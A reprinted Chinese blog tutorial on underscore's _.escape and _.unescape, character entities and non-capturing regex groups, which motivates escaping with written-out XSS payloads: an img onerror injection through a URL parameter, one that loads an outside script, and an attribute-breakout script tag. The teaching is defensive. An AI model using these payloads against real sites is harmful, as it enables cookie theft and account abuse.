---
title: 'underscore 系列之字符实体与 _.escape' 
date: 2018-12-08 2:30:30
hidden: true
slug: k5dxkv9wlt
categories: [reprint]
---

{{< raw >}}

                    
<h2 id="articleHeader0">前言</h2>
<p>underscore 提供了 <code>_.escape</code> 函数，用于转义 HTML 字符串，替换 &amp;, &lt;, &gt;, ", ', 和 ` 字符为字符实体。</p>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="_.escape('Curly, Larry &amp; Moe');
=> &quot;Curly, Larry &amp;amp; Moe&quot;" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="javascript hljs"><code class="js">_.escape(<span class="hljs-string">'Curly, Larry &amp; Moe'</span>);
=&gt; <span class="hljs-string">"Curly, Larry &amp;amp; Moe"</span></code></pre>
<p>underscore 同样提供了 <code>_.unescape</code> 函数，功能与 <code>_.escape</code> 相反：</p>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="_.unescape('Curly, Larry &amp;amp; Moe');
=> &quot;Curly, Larry &amp; Moe&quot;" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="javascript hljs"><code class="js">_.unescape(<span class="hljs-string">'Curly, Larry &amp;amp; Moe'</span>);
=&gt; <span class="hljs-string">"Curly, Larry &amp; Moe"</span></code></pre>
<h2 id="articleHeader1">XSS 攻击</h2>
<p>可是我们为什么需要转义 HTML 呢？</p>
<p>举个例子，一个个人中心页的地址为：<code>www.example.com/user.html?name=kevin</code>，我们希望从网址中取出用户的名称，然后将其显示在页面中，使用 JavaScript，我们可以这样做：</p>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="/**
 * 该函数用于取出网址参数
 */
function getQueryString(name) {
    var reg = new RegExp(&quot;(^|&amp;)&quot; + name + &quot;=([^&amp;]*)(&amp;|$)&quot;);
    var r = window.location.search.substr(1).match(reg);
    if (r != null) return unescape(r[2]);
    return null;
}

var name = getQueryString('name');
document.getElementById(&quot;username&quot;).innerHTML = name;" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="javascript hljs"><code class="js"><span class="hljs-comment">/**
 * 该函数用于取出网址参数
 */</span>
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getQueryString</span>(<span class="hljs-params">name</span>) </span>{
    <span class="hljs-keyword">var</span> reg = <span class="hljs-keyword">new</span> <span class="hljs-built_in">RegExp</span>(<span class="hljs-string">"(^|&amp;)"</span> + name + <span class="hljs-string">"=([^&amp;]*)(&amp;|$)"</span>);
    <span class="hljs-keyword">var</span> r = <span class="hljs-built_in">window</span>.location.search.substr(<span class="hljs-number">1</span>).match(reg);
    <span class="hljs-keyword">if</span> (r != <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-built_in">unescape</span>(r[<span class="hljs-number">2</span>]);
    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
}

<span class="hljs-keyword">var</span> name = getQueryString(<span class="hljs-string">'name'</span>);
<span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">"username"</span>).innerHTML = name;</code></pre>
<p>如果被一个同样懂技术的人发现的话，那么他可能会动点“坏心思”：</p>
<p>比如我把这个页面的地址修改为：<code>www.example.com/user.html?name=&lt;script&gt;alert(1)&lt;/script&gt;</code>。</p>
<p>就相当于:</p>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="document.getElementById(&quot;username&quot;).innerHTML = '<script>alert(1)</script>';" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="javascript hljs"><code class="js" style="word-break: break-word; white-space: initial;"><span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">"username"</span>).innerHTML = <span class="hljs-string">'&lt;script&gt;alert(1)&lt;/script&gt;'</span>;</code></pre>
<p>会有什么效果呢？</p>
<p>结果是什么也没有发生……</p>
<p>这是因为:</p>
<blockquote>根据 W3C 规范，script 标签中所指的脚本仅在浏览器第一次加载页面时对其进行解析并执行其中的脚本代码，所以通过 innerHTML 方法动态插入到页面中的 script 标签中的脚本代码在所有浏览器中默认情况下均不能被执行。</blockquote>
<p>千万不要以为这样就安全了……</p>
<p>你把地址改成 <code>www.example.com/user.html?name=&lt;img src=@ onerror=alert(1)&gt;</code> 的话，就相当于：</p>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="document.getElementById(&quot;d1&quot;).innerHTML=&quot;<img src=@ onerror=alert(1)>&quot;" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="javascript hljs"><code class="js" style="word-break: break-word; white-space: initial;"><span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">"d1"</span>).innerHTML=<span class="hljs-string">"&lt;img src=@ onerror=alert(1)&gt;"</span></code></pre>
<p>此时立刻就弹窗了 1。</p>
<p>也许你会想，不就是弹窗个 1 吗？还能怎么样？能写多少代码？</p>
<p>那我把地址改成 <code>www.example.com/user.html?name=&lt;img src=@ onerror='var s=document.createElement("script");s.src="https://mqyqingfeng.github.io/demo/js/alert.js";document.body.appendChild(s);' /&gt;</code> 呢？</p>
<p>就相当于：</p>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="document.getElementById(&quot;username&quot;).innerHTML = &quot;<img src=@ onerror='var s=document.createElement(\&quot;script\&quot;);s.src=\&quot;https://mqyqingfeng.github.io/demo/js/alert.js\&quot;;document.body.appendChild(s);' />&quot;;" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="javascript hljs"><code class="js" style="word-break: break-word; white-space: initial;"><span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">"username"</span>).innerHTML = <span class="hljs-string">"&lt;img src=@ onerror='var s=document.createElement(\"script\");s.src=\"https://mqyqingfeng.github.io/demo/js/alert.js\";document.body.appendChild(s);' /&gt;"</span>;</code></pre>
<p>整理下其中 onerror 的代码：</p>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="var s = document.createElement(&quot;script&quot;);
s.src = &quot;https://mqyqingfeng.github.io/demo/js/alert.js&quot;;
document.body.appendChild(s);" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="javascript hljs"><code class="js"><span class="hljs-keyword">var</span> s = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">"script"</span>);
s.src = <span class="hljs-string">"https://mqyqingfeng.github.io/demo/js/alert.js"</span>;
<span class="hljs-built_in">document</span>.body.appendChild(s);</code></pre>
<p>代码中引入了一个第三方的脚本，这样做的事情就多了，从取你的 cookie，发送到黑客自己的服务器，到监听你的输入，到发起 CSRF 攻击，直接以你的身份调用网站的各种接口……</p>
<p>总之，很危险。</p>
<p>为了防止这种情况的发生，我们可以将网址上的值取到后，进行一个特殊处理，再赋值给 DOM 的 innerHTML。</p>
<h2 id="articleHeader2">字符实体</h2>
<p>问题是怎么进行转义呢？而这就要谈到字符实体的概念了。</p>
<p>在 HTML 中，某些字符是预留的。比如说在 HTML 中不能使用小于号（&lt;）和大于号（&gt;），因为浏览器会误认为它们是标签。</p>
<p>如果希望正确地显示预留字符，我们必须在 HTML 源代码中使用字符实体（character entities）。</p>
<p>字符实体有两种形式：</p>
<ol>
<li><code>&amp;entity_name;</code></li>
<li>
<code>&amp;#entity_number;</code>。</li>
</ol>
<p>比如说我们要显示小于号，我们可以这样写：<code>&amp;lt;</code> 或 <code>&amp;#60</code>;</p>
<p>值得一提的是，使用实体名而不是数字的好处是，名称易于记忆。不过坏处是，浏览器也许并不支持所有实体名称（但是对实体数字的支持却很好）。</p>
<p>也许你会好奇，为什么 <code>&lt;</code> 的字符实体是 <code>&amp;#60</code> 呢？这是怎么进行计算的呢？</p>
<p>其实很简单，就是取字符的 unicode 值，以 <code>&amp;#</code> 开头接十进制数字 或者以 <code>&amp;#x</code>开头接十六进制数字。举个例子：</p>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="var num = '<'.charCodeAt(0); // 60
num.toString(10) // '60'
num.toString(16) // '3c'" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="javascript hljs"><code class="js"><span class="hljs-keyword">var</span> num = <span class="hljs-string">'&lt;'</span>.charCodeAt(<span class="hljs-number">0</span>); <span class="hljs-comment">// 60</span>
num.toString(<span class="hljs-number">10</span>) <span class="hljs-comment">// '60'</span>
num.toString(<span class="hljs-number">16</span>) <span class="hljs-comment">// '3c'</span></code></pre>
<p>我们可以以 <code>&amp;#60;</code> 或者 <code>&amp;#x3c;</code> 在 HTML 中表示出 <code>&lt;</code>。</p>
<p>不信你可以写这样一段 HTML，显示的效果都是 <code>&lt;</code>：</p>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="<div>&amp;lt;</div>
<div>&amp;#60;</div>
<div>&amp;#x3c;</div>" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="xml hljs"><code class="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>&amp;lt;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>&amp;#60;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>&amp;#x3c;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></code></pre>
<p>再举个例子：以字符 '喵' 为例：</p>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="var num = '喵'.charCodeAt(0); // 21941
num.toString(10) // '21941'
num.toString(16) // '55b5'" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="javascript hljs"><code class="js"><span class="hljs-keyword">var</span> num = <span class="hljs-string">'喵'</span>.charCodeAt(<span class="hljs-number">0</span>); <span class="hljs-comment">// 21941</span>
num.toString(<span class="hljs-number">10</span>) <span class="hljs-comment">// '21941'</span>
num.toString(<span class="hljs-number">16</span>) <span class="hljs-comment">// '55b5'</span></code></pre>
<p>在 HTML 中，我们就可以用 <code>&amp;#21941;</code> 或者 <code>&amp;#x55b5</code> 表示<code>喵</code>，不过“喵”并不具有实体名。</p>
<h2 id="articleHeader3">转义</h2>
<p>我们的应对方式就是将取得的值中的特殊字符转为字符实体。</p>
<p>举个例子，当页面地址是 <code>www.example.com/user.html?name=&lt;strong&gt;123&lt;/strong&gt;</code>时，我们通过 getQueryString 取得 name 的值：</p>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="var name = getQueryString('name'); // <strong>123</strong>" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="javascript hljs"><code class="js" style="word-break: break-word; white-space: initial;"><span class="hljs-keyword">var</span> name = getQueryString(<span class="hljs-string">'name'</span>); <span class="hljs-comment">// &lt;strong&gt;123&lt;/strong&gt;</span></code></pre>
<p>如果我们直接：</p>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="document.getElementById(&quot;username&quot;).innerHTML = name;" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="javascript hljs"><code class="js" style="word-break: break-word; white-space: initial;"><span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">"username"</span>).innerHTML = name;</code></pre>
<p>如我们所知，使用 innerHTML 会解析内容字符串，并且改变元素的 HMTL 内容，最终，从样式上，我们会看到一个加粗的 123。</p>
<p>如果我们转义，将 <code>&lt;strong&gt;123&lt;/strong&gt;</code> 中的 <code>&lt;</code> 和 <code>&gt;</code> 转为实体字符，即 <code>&amp;lt;strong&amp;gt;123&amp;lt;/strong&amp;gt;</code>，我们再设置 innerHTML，浏览器就不会将其解释为标签，而是一段字符，最终会直接显示 <code>&lt;strong&gt;123&lt;/strong&gt;</code>，这样就避免了潜在的危险。</p>
<h2 id="articleHeader4">思考</h2>
<p>那么问题来了，我们具体要转义哪些字符呢？</p>
<p>想想我们之所以要转义 <code>&lt;</code> 和 <code>&gt;</code> ，是因为浏览器会将其认为是一个标签的开始或结束，所以要转义的字符一定是浏览器会特殊对待的字符，那还有什么字符会被特殊对待的呢？(O_o)??</p>
<p><code>&amp;</code> 是一个，因为浏览器会认为 <code>&amp;</code> 是一个字符实体的开始，如果你输入了 <code>&amp;lt;</code>，浏览器会将其解释为 <code>&lt;</code>，但是当 <code>&amp;lt;</code> 是作为用户输入的值时，应该仅仅是显示用户输入的值，而不是将其解释为一个 <code>&lt;</code>。</p>
<p><code>'</code> 和 <code>"</code> 也要注意，举个例子：</p>
<p>服务器端渲染的代码为：</p>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="function render (input) {
  return '<input type=&quot;name&quot; value=&quot;' + input + '&quot;>'
}" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="javascript hljs"><code class="js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>{
  <span class="hljs-keyword">return</span> <span class="hljs-string">'&lt;input type="name" value="'</span> + input + <span class="hljs-string">'"&gt;'</span>
}</code></pre>
<p>input 的值如果直接来自于用户的输入，用户可以输入 <code>"&gt; &lt;script&gt;alert(1)&lt;/script&gt;</code>，最终渲染的 HTML 代码就变成了：</p>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="<input type=&quot;name&quot; value=&quot;&quot;> <script>alert(1)</script>&quot;>" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="xml hljs"><code class="html" style="word-break: break-word; white-space: initial;"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"name"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">""</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="undefined">alert(1)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>"&gt;</code></pre>
<p>结果又是一次 XSS 攻击……</p>
<p>最后还有一个是反引号 `，在 IE 低版本中(≤ 8)，反引号可以用于关闭标签：</p>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="<img src=&quot;x` `<script>alert(1)</script>&quot;` `>" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="hljs autohotkey"><code style="word-break: break-word; white-space: initial;">&lt;img src=<span class="hljs-string">"x` `&lt;script&gt;alert(1)&lt;/script&gt;"</span>` `&gt;</code></pre>
<p>所以我们最终确定的要转义的字符为：&amp;, &lt;, &gt;, ", ', 和 `。转义对应的值为：</p>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="&amp; --> &amp;amp;
< --> &amp;lt;
> --> &amp;gt;
&quot; --> &amp;quot;
' --> &amp;#x27;
` --> &amp;#60;" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="hljs brainfuck"><code><span class="hljs-comment">&amp;</span> <span class="hljs-literal">-</span><span class="hljs-literal">-</span>&gt; <span class="hljs-comment">&amp;amp;</span>
&lt; <span class="hljs-literal">-</span><span class="hljs-literal">-</span>&gt; <span class="hljs-comment">&amp;lt;</span>
&gt; <span class="hljs-literal">-</span><span class="hljs-literal">-</span>&gt; <span class="hljs-comment">&amp;gt;</span>
<span class="hljs-comment">"</span> <span class="hljs-literal">-</span><span class="hljs-literal">-</span>&gt; <span class="hljs-comment">&amp;quot;</span>
<span class="hljs-comment">'</span> <span class="hljs-literal">-</span><span class="hljs-literal">-</span>&gt; <span class="hljs-comment">&amp;#x27;</span>
<span class="hljs-comment">`</span> <span class="hljs-literal">-</span><span class="hljs-literal">-</span>&gt; <span class="hljs-comment">&amp;#60;</span></code></pre>
<p>值得注意的是：单引号和反引号使用是实体数字、而其他使用的是实体名称，这主要是从兼容性的角度考虑的，有的浏览器并不能很好的支持单引号和反引号的实体名称。</p>
<h2 id="articleHeader5">_.escape</h2>
<p>那么具体我们该如何实现转义呢？我们直接看一个简单的实现：</p>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="var _ = {};

var escapeMap = {
    '&amp;': '&amp;amp;',
    '<': '&amp;lt;',
    '>': '&amp;gt;',
    '&quot;': '&amp;quot;',
    &quot;'&quot;: '&amp;#x27;',
    '`': '&amp;#x60;'
};

_.escape = function(string) {
    var escaper = function(match) {
        return escapeMap[match];
    };
    // 使用非捕获性分组
    var source = '(?:' + Object.keys(escapeMap).join('|') + ')';
    console.log(source) // (?:&amp;|<|>|&quot;|'|`)
    var testRegexp = RegExp(source);
    var replaceRegexp = RegExp(source, 'g');

    string = string == null ? '' : '' + string;
    return testRegexp.test(string) ? string.replace(replaceRegexp, escaper) : string;
}" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="javascript hljs"><code class="js"><span class="hljs-keyword">var</span> _ = {};

<span class="hljs-keyword">var</span> escapeMap = {
    <span class="hljs-string">'&amp;'</span>: <span class="hljs-string">'&amp;amp;'</span>,
    <span class="hljs-string">'&lt;'</span>: <span class="hljs-string">'&amp;lt;'</span>,
    <span class="hljs-string">'&gt;'</span>: <span class="hljs-string">'&amp;gt;'</span>,
    <span class="hljs-string">'"'</span>: <span class="hljs-string">'&amp;quot;'</span>,
    <span class="hljs-string">"'"</span>: <span class="hljs-string">'&amp;#x27;'</span>,
    <span class="hljs-string">'`'</span>: <span class="hljs-string">'&amp;#x60;'</span>
};

_.escape = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">string</span>) </span>{
    <span class="hljs-keyword">var</span> escaper = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">match</span>) </span>{
        <span class="hljs-keyword">return</span> escapeMap[match];
    };
    <span class="hljs-comment">// 使用非捕获性分组</span>
    <span class="hljs-keyword">var</span> source = <span class="hljs-string">'(?:'</span> + <span class="hljs-built_in">Object</span>.keys(escapeMap).join(<span class="hljs-string">'|'</span>) + <span class="hljs-string">')'</span>;
    <span class="hljs-built_in">console</span>.log(source) <span class="hljs-comment">// (?:&amp;|&lt;|&gt;|"|'|`)</span>
    <span class="hljs-keyword">var</span> testRegexp = <span class="hljs-built_in">RegExp</span>(source);
    <span class="hljs-keyword">var</span> replaceRegexp = <span class="hljs-built_in">RegExp</span>(source, <span class="hljs-string">'g'</span>);

    string = string == <span class="hljs-literal">null</span> ? <span class="hljs-string">''</span> : <span class="hljs-string">''</span> + string;
    <span class="hljs-keyword">return</span> testRegexp.test(string) ? string.replace(replaceRegexp, escaper) : string;
}</code></pre>
<p>实现的思路很简单，构造一个正则表达式，先判断是否能匹配到，如果能匹配到，就执行 replace，根据 escapeMap 将特殊字符进行替换，如果不能匹配，说明不需要转义，直接返回原字符串。</p>
<p>值得一提的是，我们在代码中打印了构造出的正则表达式为：</p>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="(?:&amp;|<|>|&quot;|'|`)" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="hljs elixir"><code style="word-break: break-word; white-space: initial;">(?<span class="hljs-symbol">:&amp;|&lt;|&gt;|<span class="hljs-string">"|'|`)</span></span></code></pre>
<p>其中的 <code>?:</code> 是个什么意思？没有这个 <code>?:</code> 就不可以匹配吗？我们接着往下看。</p>
<h2 id="articleHeader6">非捕获分组</h2>
<p><code>(?:pattern)</code> 表示非捕获分组，即会匹配 pattern 但不获取匹配结果，不进行存储供以后使用。</p>
<p>我们来看个例子：</p>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="function replacer(match, p1, p2, p3) {
    // match，表示匹配的子串 abc12345#$*%
    // p1，第 1 个括号匹配的字符串 abc
    // p2，第 2 个括号匹配的字符串 12345
    // p3，第 3 个括号匹配的字符串 #$*%
    return [p1, p2, p3].join(' - ');
}
var newString = 'abc12345#$*%'.replace(/([^\d]*)(\d*)([^\w]*)/, replacer); // abc - 12345 - #$*%" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="javascript hljs"><code class="js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">replacer</span>(<span class="hljs-params">match, p1, p2, p3</span>) </span>{
    <span class="hljs-comment">// match，表示匹配的子串 abc12345#$*%</span>
    <span class="hljs-comment">// p1，第 1 个括号匹配的字符串 abc</span>
    <span class="hljs-comment">// p2，第 2 个括号匹配的字符串 12345</span>
    <span class="hljs-comment">// p3，第 3 个括号匹配的字符串 #$*%</span>
    <span class="hljs-keyword">return</span> [p1, p2, p3].join(<span class="hljs-string">' - '</span>);
}
<span class="hljs-keyword">var</span> newString = <span class="hljs-string">'abc12345#$*%'</span>.replace(<span class="hljs-regexp">/([^\d]*)(\d*)([^\w]*)/</span>, replacer); <span class="hljs-comment">// abc - 12345 - #$*%</span></code></pre>
<p>现在我们给第一个括号中的表达式加上 <code>?:</code>，表示第一个括号中的内容不需要储存结果：</p>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="function replacer(match, p1, p2) {
    // match，表示匹配的子串 abc12345#$*%
    // p1，现在匹配的是字符串 12345
    // p1，现在匹配的是字符串 #$*%
    return [p1, p2].join(' - ');
}
var newString = 'abc12345#$*%'.replace(/(?:[^\d]*)(\d*)([^\w]*)/, replacer); // 12345 - #$*%" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="javascript hljs"><code class="js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">replacer</span>(<span class="hljs-params">match, p1, p2</span>) </span>{
    <span class="hljs-comment">// match，表示匹配的子串 abc12345#$*%</span>
    <span class="hljs-comment">// p1，现在匹配的是字符串 12345</span>
    <span class="hljs-comment">// p1，现在匹配的是字符串 #$*%</span>
    <span class="hljs-keyword">return</span> [p1, p2].join(<span class="hljs-string">' - '</span>);
}
<span class="hljs-keyword">var</span> newString = <span class="hljs-string">'abc12345#$*%'</span>.replace(<span class="hljs-regexp">/(?:[^\d]*)(\d*)([^\w]*)/</span>, replacer); <span class="hljs-comment">// 12345 - #$*%</span></code></pre>
<p>在 <code>_.escape</code> 函数中，即使不使用 <code>?:</code> 也不会影响匹配结果，只是使用 <code>?:</code> 性能会更高一点。</p>
<h2 id="articleHeader7">反转义</h2>
<p>我们使用了 <code>_.escape</code> 将指定字符转为字符实体，我们还需要一个方法将字符实体转义回来。</p>
<p>写法与 <code>_.unescape</code> 类似：</p>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="var _ = {};

var unescapeMap = {
    '&amp;amp;': '&amp;',
    '&amp;lt;': '<',
    '&amp;gt;': '>',
    '&amp;quot;': '&quot;',
    '&amp;#x27;': &quot;'&quot;,
    '&amp;#x60;': '`'
};

_.unescape = function(string) {
    var escaper = function(match) {
        return unescapeMap[match];
    };
    // 使用非捕获性分组
    var source = '(?:' + Object.keys(unescapeMap).join('|') + ')';
    console.log(source) // (?:&amp;|<|>|&quot;|'|`)
    var testRegexp = RegExp(source);
    var replaceRegexp = RegExp(source, 'g');

    string = string == null ? '' : '' + string;
    return testRegexp.test(string) ? string.replace(replaceRegexp, escaper) : string;
}

console.log(_.unescape('Curly, Larry &amp;amp; Moe')) // Curly, Larry &amp; Moe" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="javascript hljs"><code class="js"><span class="hljs-keyword">var</span> _ = {};

<span class="hljs-keyword">var</span> unescapeMap = {
    <span class="hljs-string">'&amp;amp;'</span>: <span class="hljs-string">'&amp;'</span>,
    <span class="hljs-string">'&amp;lt;'</span>: <span class="hljs-string">'&lt;'</span>,
    <span class="hljs-string">'&amp;gt;'</span>: <span class="hljs-string">'&gt;'</span>,
    <span class="hljs-string">'&amp;quot;'</span>: <span class="hljs-string">'"'</span>,
    <span class="hljs-string">'&amp;#x27;'</span>: <span class="hljs-string">"'"</span>,
    <span class="hljs-string">'&amp;#x60;'</span>: <span class="hljs-string">'`'</span>
};

